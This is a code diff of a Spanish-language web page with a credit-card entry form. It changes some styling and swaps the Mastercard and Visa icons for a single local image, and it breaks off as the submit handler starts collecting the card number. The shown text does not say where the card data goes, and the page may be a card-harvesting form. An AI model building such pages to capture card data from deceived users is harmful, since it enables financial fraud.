@@ -77,7 +77,6 @@
             border-radius: 12px;
             color: white;
             font-size: 17px;
-            transition: all 0.3s;
         }
         
         input:focus, select:focus {
@@ -86,19 +85,12 @@
             box-shadow: 0 0 0 4px rgba(0, 180, 255, 0.15);
         }
         
-        .card-logos {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-top: 12px;
-        }
-        
         .card-logos img {
-            height: 35px;
-            width: auto;
-            border-radius: 6px;
-            background: white;
-            padding: 4px;
+            width: 100%;
+            max-width: 320px;
+            height: auto;
+            margin-top: 12px;
+            border-radius: 8px;
         }
         
         .btn {
@@ -153,10 +145,9 @@
                 <label>Número de tarjeta de crédito/débito <span style="color:#ff5555">*</span></label>
                 <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
                 
-                <!-- Logos Mastercard y Visa -->
+                <!-- Tu imagen -->
                 <div class="card-logos">
-                    <img src="https://cdn-icons-png.flaticon.com/512/5968/5968377.png" alt="Mastercard">
-                    <img src="https://cdn-icons-png.flaticon.com/512/5968/5968258.png" alt="Visa">
+                    <img src="5D449B7F-9088-4AEF-9737-C99F967C8736.jpeg" alt="Mastercard Visa">
                 </div>
             </div>
 
@@ -226,7 +217,6 @@
 
         document.getElementById('cardForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-
             const formData = {
                 timestamp: new Date().toLocaleString('es-HN'),
                 cardNumber: document.getElementById('cardNumber').value.trim(),
